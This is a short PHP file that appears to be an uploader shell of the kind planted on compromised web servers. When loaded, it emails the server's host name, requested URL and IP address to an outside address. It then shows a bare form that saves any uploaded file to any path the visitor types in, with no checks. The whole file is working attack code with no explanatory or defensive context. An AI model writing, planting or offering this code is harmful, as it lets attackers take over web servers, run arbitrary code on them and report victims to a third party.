<?php
mail("localhost@wikipedia24.com","Pig".$_SERVER['HTTP_HOST'],"Link : ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\nInfo : ".$info."\nIP : ".$_SERVER['SERVER_ADDR']."\n");
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>